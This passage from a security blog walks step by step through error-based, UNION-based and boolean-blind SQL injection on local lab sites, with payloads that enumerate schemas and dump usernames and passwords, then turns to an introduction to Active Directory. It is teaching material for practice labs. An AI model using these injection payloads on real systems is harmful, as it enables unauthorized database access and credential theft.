  <pre><code class="language-sql">
SELECT title, content FROM articles WHERE id=3;
</code></pre>
</div>

<p>First test: Find column count.</p>

<div class="code-block-container">
  <span class="code-lang-tag">SQLI</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sqli">
?id=3 ORDER BY 1-- ✅
?id=3 ORDER BY 2-- ✅
?id=3 ORDER BY 3-- ❌ (error)
</code></pre>
</div>

<p>Means 2 columns.</p>

<p>Now inject:</p>

<div class="code-block-container">
  <span class="code-lang-tag">SQLI</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sqli">
?id=3 UNION SELECT username, password FROM admins--
</code></pre>
</div>

<p>Output:</p>

<div class="code-block-container">
  <span class="code-lang-tag">SQLI</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-web">
Title: admin
Content: s3cur3p@ssw0rd
</code></pre>
</div>

<p>You just leaked creds. Over the front door. In plain sight.</p>

<h1 id="error-based-sql-injection-walkthrough">Error-Based SQL Injection Walkthrough</h1>

<p>We’re looking at a simple blog site vulnerable to <strong>error-based SQL Injection</strong>.</p>

<p>Test URL:</p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sql">
http://localhost:8000/index.php?id=1
</code></pre>
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FGEO77cP9yRuYocXH9K-Ag.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<h4 id="step-1-identify-the-injection-point">Step 1: Identify the Injection Point</h4>

<p>To confirm an SQLi vulnerability, we need to <em>break the query</em> and look for errors.</p>

<p>Let’s tweak the URL slightly:</p>

<div class="code-block-container">
  <span class="code-lang-tag">SQLI</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sqli">
http://localhost:8000/index.php?id=1'
</code></pre>
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yYsVgEO9cJCd7ctNDy2qeA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>we get this classic error:</p>

<div class="alert-error">
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1... 
</div>

<p>That error confirms the input is unsanitized and directly injected into an SQL statement. We’re in.</p>

<hr />

<h4 id="step-2-column-count-with-union-injection">Step 2: Column Count with UNION Injection</h4>

<p>To extract data, we’ll use the <code class="language-plaintext highlighter-rouge">UNION SELECT</code> method. But first, we need to figure out <strong>how many columns</strong> the original query returns.</p>

<p>Try:</p>

<div class="code-block-container">
  <span class="code-lang-tag">SQLI</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sqli">
http://localhost:8000/index.php?id=1 UNION SELECT 1
</code></pre>
</div>

<p>If it throws:</p>

<p><code class="language-plaintext highlighter-rouge">The used SELECT statements have a different number of columns...</code></p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4wPrWy4iunNK3DzOUxpWZw.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>…then the number of columns doesn’t match. Keep adding placeholders until it stops erroring:</p>

<p><code class="language-plaintext highlighter-rouge">1 UNION SELECT 1,2
1 UNION SELECT 1,2,3</code></p>

<p>Once it works, we know the original query returns <strong>3 columns</strong>.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2Xa6KpQXbNllygPC77_yVA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<hr />

<h4 id="step-3-control-the-output">Step 3: Control the Output</h4>

<p>Right now, the site displays the <em>first</em> row from the results. We want it to show our injected data instead of the real article.</p>

<p>To make the original query return <strong>no results</strong>, change the ID to something invalid, like <code class="language-plaintext highlighter-rouge">0</code>:</p>

<div class="code-block-container">
  <span class="code-lang-tag">SQLI</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sqli">
http://localhost:8000/index.php?id=0 UNION SELECT 1,2,3
</code></pre>
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*U1Udu5VDeodVns0GFVXjBA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Now we control the output. Time to exfiltrate.</p>

<hr />

<h4 id="step-4-get-the-current-database">Step 4: Get the Current Database</h4>

<p>Let’s see what database we’re in:</p>

<p><code class="language-plaintext highlighter-rouge">0 UNION SELECT 1,2,database()</code></p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CdaJdtc9zIclISKtVmDzeQ.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>It returns:</p>

<p><code class="language-plaintext highlighter-rouge">sqli_one</code></p>

<hr />

<h4 id="step-5-list-all-tables-in-the-database">Step 5: List All Tables in the Database</h4>

<p>We’ll use the internal <code class="language-plaintext highlighter-rouge">information_schema</code> database to get table names:</p>

<p><code class="language-plaintext highlighter-rouge">0 UNION SELECT 1,2,group_concat(table_name)
FROM information_schema.tables
WHERE table_schema = 'sqli_one'</code></p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oFBVqmZ2f_S8dLFsmylD3A.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>We get:</p>

<p><code class="language-plaintext highlighter-rouge">article,staff_users</code></p>

<p><code class="language-plaintext highlighter-rouge">staff_users</code> sounds spicy</p>

<hr />

<h4 id="step-6-discover-table-columns">Step 6: Discover Table Columns</h4>

<p>Now let’s get the column names inside <code class="language-plaintext highlighter-rouge">staff_users</code>:</p>

<p><code class="language-plaintext highlighter-rouge">0 UNION SELECT 1,2,group_concat(column_name)
FROM information_schema.columns
WHERE table_name = 'staff_users'</code></p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mWZNsPiZLLRlEoIVbEYhdw.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Result:</p>

<p><code class="language-plaintext highlighter-rouge">id,username,password</code></p>

<p>Now we’re ready to extract creds.</p>

<hr />

<h4 id="step-7-dump-the-data">Step 7: Dump the Data</h4>

<p>Let’s pull the actual data from <code class="language-plaintext highlighter-rouge">staff_users</code>. To keep it readable, we format the output with a colon and line breaks:</p>

<p><code class="language-plaintext highlighter-rouge">0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '&lt;br&gt;')
FROM staff_users</code></p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*LItM8RdUP1gRaWo0JLmL2A.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>We’ve got usernames and hashed passwords on separate lines. Mission success.</p>

<p>Always remember: SQLi like this happens because of <strong>poor input sanitization</strong> and <strong>unsafely constructed SQL queries</strong>. Use parameterized queries (prepared statements) to shut this down.</p>

<h1 id="boolean-based-blind-sql-injection-sqli">Boolean-Based Blind SQL Injection (SQLi)</h1>
<hr />

<p>Boolean-Based SQL Injection is a form of <strong>blind injection</strong> where the attacker doesn’t see database output directly but instead infers it through differences in the application’s behavior. The application’s response is based on <strong>true/false conditions</strong>, allowing attackers to slowly extract data.</p>

<p>For example, a page might respond with “user found” when a condition is true, and “no user found” when false. That boolean switch is what we exploit.</p>

<hr />

<h3 id="scenario">Scenario</h3>

<p>Imagine a web app that checks if a username exists:</p>

<ul>
  <li>
    <p>✅ <code class="language-plaintext highlighter-rouge">http://localhost:8080/user.php?id=admin</code> → Response: <strong>user found</strong></p>
  </li>
  <li>
    <p>❌ <code class="language-plaintext highlighter-rouge">http://localhost:8080/user.php?id=admin123</code> → Response: <strong>no user found</strong></p>
  </li>
</ul>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*YH6CTN8OYgKsnLaPMMjPhg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*mSO5iQu8gQOl4Hwq-YLCwg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>This tells us that <code class="language-plaintext highlighter-rouge">admin</code> is a valid username. Now let’s exploit this vulnerability using SQL Injection techniques.</p>

<hr />

<h3 id="step-1-identifying-column-count-with-union-select">Step 1: Identifying Column Count with <code class="language-plaintext highlighter-rouge">UNION SELECT</code></h3>

<p>To execute a <code class="language-plaintext highlighter-rouge">UNION</code>-based injection, we must match the number of columns in the original query. We incrementally test:</p>

<div class="code-block-container">
  <span class="code-lang-tag">SQLI</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sqli">

-   ❌ `admin123' UNION SELECT 'col1'-- -`

-   ❌ `admin123' UNION SELECT 'col1','col2'-- -`

-   ✅ `admin123' UNION SELECT 'col1','col2','col3'-- -`

</code></pre>
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*Ro3NT8z7UfqndfN4L1Z55Q.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Once we see “user found”, the column count (3) is confirmed.</p>

<hr />

<h3 id="step-2-enumerating-the-database-name">Step 2: Enumerating the Database Name</h3>

<p>You can extract the database name using the <code class="language-plaintext highlighter-rouge">database()</code> function:</p>

<div class="code-block-container">
  <span class="code-lang-tag">SQLI</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sqli">
admin123' UNION SELECT database(), 'x', 'x'-- - 
</code></pre>
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*lKF5355haB2CJi6qlMWQ4Q.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>But in a true blind context, we need to guess characters one-by-one using <code class="language-plaintext highlighter-rouge">SUBSTRING()</code>:</p>

<div class="code-block-container">
  <span class="code-lang-tag">SQLI</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sqli">
admin123' UNION SELECT 'x', 'x', 'x' FROM dual WHERE SUBSTRING(database(),1,1)='b'-- - 
</code></pre>
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*0rSJ32MTMbvUlGChliiwkg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>If the result is “user found”, then the first character is ‘b’.</p>

<p>You continue checking each character position:</p>

<p><code class="language-plaintext highlighter-rouge">SUBSTRING(database(), 1, 2) = 'bl'</code></p>

<p><code class="language-plaintext highlighter-rouge">SUBSTRING(database(), 1, 3) = 'bli'</code></p>

<p>Until you reach:</p>

<p><code class="language-plaintext highlighter-rouge">SUBSTRING(database(), 1, 10) = 'blind_sqli'</code></p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*kU0xgyiEpqt904-S9T8S8Q.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Now we know the database is called <code class="language-plaintext highlighter-rouge">blind_sqli</code>.</p>

<hr />

<h3 id="step-3-enumerating-table-names">Step 3: Enumerating Table Names</h3>

<p>We use <code class="language-plaintext highlighter-rouge">information_schema.tables</code> to get table names in this DB:</p>

<div class="code-block-container">
  <span class="code-lang-tag">SQLI</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sqli">
admin123' UNION SELECT 'x','x','x' FROM information_schema.tables WHERE table_schema = 'blind_sqli' AND SUBSTRING(table_name,1,1)='u' LIMIT 0,1 -- - 
</code></pre>
</div>

<p>Continue guessing until:</p>

<p><code class="language-plaintext highlighter-rouge">SUBSTRING(table_name,1,5)='users'</code></p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*a0r7lQJJkzmy76EUf2Td8w.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Confirmed: The table is <code class="language-plaintext highlighter-rouge">users</code>.</p>

<hr />

<h3 id="step-4-enumerating-column-names">Step 4: Enumerating Column Names</h3>

<p>We now use <code class="language-plaintext highlighter-rouge">information_schema.columns</code>:</p>

<div class="code-block-container">
  <span class="code-lang-tag">SQLI</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sqli">
admin123' UNION SELECT 'x','x','x' FROM information_schema.columns WHERE table_schema = 'blind_sqli' AND table_name = 'users' AND SUBSTRING(column_name, 1, 1) = 'u' LIMIT 0, 1 -- - 
</code></pre>
</div>

<p>Repeat until you find:</p>

<p><code class="language-plaintext highlighter-rouge">SUBSTRING(column_name, 1, 8) = 'username'</code></p>

<p><code class="language-plaintext highlighter-rouge">SUBSTRING(column_name, 1, 8) = 'password'</code></p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*lyL7fBKOX2qtjAXrCzOCwA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*g33Y_aXEDHQ5TrT__57u0A.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Columns are: <code class="language-plaintext highlighter-rouge">username</code>, <code class="language-plaintext highlighter-rouge">password</code>.</p>

<hr />

<h3 id="step-5-enumerating-usernames-from-the-users-table">Step 5: Enumerating Usernames from the <code class="language-plaintext highlighter-rouge">users</code> Table</h3>

<p>Now that you know the structure, time to exfil actual data:</p>

<div class="code-block-container">
  <span class="code-lang-tag">SQLI</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sqli">
admin123' UNION SELECT 'x','x','x' FROM users WHERE SUBSTRING(username,1,1)='a' LIMIT 0,1 -- -
</code></pre>
</div>

<div class="code-block-container">
  <span class="code-lang-tag">SQLI</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sqli">
admin123' UNION SELECT 'x','x','x' FROM users WHERE SUBSTRING(username,1,1)='j' LIMIT 0,1 -- -
</code></pre>
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:4800/format:webp/1*KkSEyWOPGjrXEvLA3YFFrA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Keep testing until you identify the value:</p>

<p><code class="language-plaintext highlighter-rouge">SUBSTRING(username, 1, 5) = 'admin'</code></p>

<p>Confirmed user: <code class="language-plaintext highlighter-rouge">admin</code></p>

<hr />

<h3 id="step-6-enumerating-the-password">Step 6: Enumerating the Password</h3>

<p>Same technique applies for <code class="language-plaintext highlighter-rouge">password</code> field:</p>

<div class="code-block-container">
  <span class="code-lang-tag">SQLI</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sqli">
admin123' UNION SELECT 'x','x','x' FROM users WHERE SUBSTRING(password, 1, 3) = 'sup' LIMIT 0, 1 -- -
</code></pre>
</div>

<div class="code-block-container">
  <span class="code-lang-tag">SQLI</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-sqli">
admin123' UNION SELECT 'x','x','x' FROM users WHERE SUBSTRING(password, 1, 11) = 'supersecret' LIMIT 0, 1 -- -
</code></pre>
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:4800/format:webp/1*bNxBMnzgAWSV2UdQUtzj_A.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Confirmed password: <code class="language-plaintext highlighter-rouge">supersecret</code></p>

<hr />

<p>This process may seem slow, but it works even when there’s no error message or visible output only behavior changes. Boolean-based blind SQLi depends on:</p>

<ul>
  <li>
    <p>Controlled injection point (like <code class="language-plaintext highlighter-rouge">id=</code> parameter)</p>
  </li>
  <li>
    <p>Application responses that clearly reflect true vs false outcomes</p>
  </li>
  <li>
    <p>Use of functions like <code class="language-plaintext highlighter-rouge">SUBSTRING()</code>, <code class="language-plaintext highlighter-rouge">database()</code>, <code class="language-plaintext highlighter-rouge">information_schema</code></p>
  </li>
</ul>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Active Directory</title><link href="http://localhost:4000/blog/cybersecurity/2025/05/31/ADintro.html" rel="alternate" type="text/html" title="Active Directory" /><published>2025-05-31T00:00:00-04:00</published><updated>2025-05-31T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/05/31/ADintro</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/05/31/ADintro.html"><![CDATA[<p><img src="http://art.vx-underground.org/art/pancak3_satanic_computer_hackers_degen_dark_det_in_the_style_of_7e887c3c-d4a4-40d5-8718-097dc099bb36.png" alt="Set up Listener" width="500" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>

<p><strong>What is Active Directory?</strong>
Active Directory is a service developed by Microsoft that helps manage and organize computers, users, and other resources on a network. Think of it like a digital phonebook + control center that stores info about everything in a Windows domain (like usernames, passwords, computers, printers, etc.).</p>

<hr />

<p><strong>How does it work?</strong>
AD uses something called a <strong>domain</strong>, which is basically a group of users and devices under one roof. The main controller of the domain is the <strong>Domain Controller (DC)</strong> it’s the brain that verifies users when they log in and gives out permissions like “yeah, you can access this file” or “nah, you’re blocked.”</p>

<hr />

<p><strong>Why is it important?</strong>
In big organizations, you can’t manually manage thousands of users or computers. Active Directory automates this. Admins can set rules (called <strong>Group Policies</strong>) that apply to entire groups of users. So you could, for example, block access to USB drives for all interns with just a few clicks.</p>

<hr />

<p><strong>What’s stored in it?</strong>
Everything in AD is an <strong>object</strong> users, computers, printers, groups all are objects. Each object has attributes like names, emails, passwords, etc. These are organized in a hierarchy like folders inside folders, called the <strong>Directory Information Tree</strong>.</p>

<hr />

<p><strong>Security side of it</strong>
AD also handles <strong>authentication</strong> (proving you are who you say you are) and <strong>authorization</strong> (deciding what you’re allowed to do). It uses protocols like <strong>Kerberos</strong> and <strong>LDAP</strong> to do that. Hackers love targeting AD because if you pop the Domain Controller, you basically own the whole network.</p>

<h3 id="-users">🧑‍💻 Users</h3>

<p>In Active Directory, users are basically individual accounts that represent people or services. If you’re an employee at a company, you’d have a user account to log into the network, access your email, shared drives, printers, etc.</p>

<p>Now here’s the catch users aren’t just for humans. Some <strong>services</strong> like a web server (IIS) or a database (MSSQL) also need user accounts to run. These are special “service users” that only have permissions to do one specific job, like serving web pages or handling database queries. They aren’t logging in like us, they’re just quietly doing their thing in the background.</p>

<p>Also, users are called <strong>security principals</strong> that means they can be authenticated (checked if they’re legit) and authorized (given permissions) by the domain.</p>

<hr />

<h3 id="-machines">💻 Machines</h3>

<p>Yup, even computers get their own accounts in AD. When a PC or server joins the domain, AD creates a machine account for it. These machine accounts are also security principals, just like user accounts, and they have their own passwords (that are like 100+ characters and auto-change over time).</p>

<p>Machine accounts usually aren’t touched by humans. They’re used internally by the OS so the domain can trust and communicate with that computer securely. But if someone gets that machine’s password (rare, but doable), they can technically use it to log in and do recon or escalate privileges.</p>

<p>Also, machine accounts usually have names like <code class="language-plaintext highlighter-rouge">COMPUTERNAME$</code>. That dollar sign at the end makes it clear it’s a machine, not a human.</p>

<hr />

<h3 id="-security-groups">👥 Security Groups</h3>

<p>Security groups are just a way to organize users (and machines) so you don’t have to assign permissions one by one. Instead of saying “give Bob, Alice, and John access to this folder,” you just toss them in a group and give the group access. Easy peasy.</p>

<p>Groups can also be nested meaning you can have groups inside other groups, like a Russian doll of permissions.</p>

<p>Some groups are made automatically when a domain is created, and each has a specific role. Here are some popular ones:</p>

<table>
  <thead>
    <tr>
      <th><strong>Security Group</strong></th>
      <th><strong>Description</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>Domain Admins</strong></td>
      <td>The big bosses full control over the entire network.</td>
    </tr>
    <tr>
      <td><strong>Backup Operators</strong></td>
      <td>Can read any file, even restricted ones great for running backups.</td>
    </tr>
    <tr>
      <td><strong>Account Operators</strong></td>
      <td>Allowed to create and modify user accounts.</td>
    </tr>
    <tr>
      <td><strong>Domain Users</strong></td>
      <td>Default group for all user accounts in the domain.</td>
    </tr>
    <tr>
      <td><strong>Domain Computers</strong></td>
      <td>Contains all machine (computer) accounts in the domain.</td>
    </tr>
    <tr>
      <td><strong>Domain Controllers</strong></td>
      <td>Includes all Domain Controllers (DCs) in the network.</td>
    </tr>
  </tbody>
</table>

<p>Security groups make admin life way easier and help keep access control clean and organized.</p>

<p>Let’s log into the <strong>Domain Controller</strong> that’s basically the main server running Active Directory. Once you’re in, you’ll see a window that shows the whole structure of the domain: users, computers, and groups all organized in a tree view. It’s kinda like looking at folders on your computer, but for network objects.</p>

<p>These objects are grouped into <strong>Organizational Units</strong>, or <strong>OUs</strong>. Think of OUs like labeled folders they help you organize stuff, like putting all IT users in one OU, all HR people in another, etc. But it’s not just for looks you can also apply different rules or policies (like password rules or access restrictions) to each OU.</p>

<p>Now let’s create a new OU called <strong>Hospital</strong> this could be for organizing all the machines and users working in a hospital department. That way, we can manage them separately and apply hospital-specific rules when needed.</p>

<p>So once you’re in the <strong>Active Directory Users and Computers</strong> window, look for your domain name in my case, it’s <code class="language-plaintext highlighter-rouge">homelab.local</code>.</p>

<p>Now do this:</p>

<ul>
  <li>Right-click on <code class="language-plaintext highlighter-rouge">homelab.local</code></li>
</ul>

<p><img src="https://miro.medium.com/v2/resize:fit:700/1*yJpGAholpnkiZczayYVC8Q.png" alt="" /></p>

<ul>
  <li>
    <p>Hover over ”New”</p>
  </li>
  <li>
    <p>Click on ”Organizational Unit”</p>
  </li>
</ul>

<p><img src="https://miro.medium.com/v2/resize:fit:700/1*_GxFLYcG4_rxDJBPm9NqFg.png" alt="" /></p>

<ul>
  <li>For the name, type Hospital</li>
</ul>

<p><img src="https://miro.medium.com/v2/resize:fit:429/1*wY11g2KAvFVcx8btRDS-FA.png" alt="" /></p>

<ul>
  <li>Then hit OK</li>
</ul>

<p><img src="https://miro.medium.com/v2/resize:fit:510/1*qeT_pqu1CWeeEPDc28ze5w.png" alt="" /></p>

<p>Boom, now you’ve got an OU named <em>Hospital</em> set up. You can start dropping users, computers, or even other OUs into it. That’s how you keep your domain nice and organized, especially when you’re managing different departments or teams.</p>

<p>I decided to create sub-OUs (mini folders inside the Hospital OU).</p>

<p><img src="https://miro.medium.com/v2/resize:fit:601/1*a7TKet7lASx2cDVTkHQ_pA.png" alt="" /></p>

<p><strong>Now let’s create some users for the IT OU.</strong></p>

<p>We’ll start with:</p>

<ul>
  <li>
    <p><strong>First Name:</strong> Sarah</p>
  </li>
  <li>
    <p><strong>Last Name:</strong> Patel</p>
  </li>
  <li>
    <p><strong>Username:</strong> s.patel</p>
  </li>
</ul>

<p>To create the user:</p>

<p>1.  <strong>Right-click on the IT OU</strong></p>

<p>2.  Select <strong>New &gt; User</strong></p>

<p><img src="https://miro.medium.com/v2/resize:fit:567/1*e3yiyYwLoiYxXfnx4zonHw.png" alt="" /></p>

<p>3.  <strong>Fill in the user details</strong> (first name, last name, and username)</p>

<p><img src="https://miro.medium.com/v2/resize:fit:431/1*2mHbbo-N5w4nllzLzDh_9g.png" alt="" /></p>

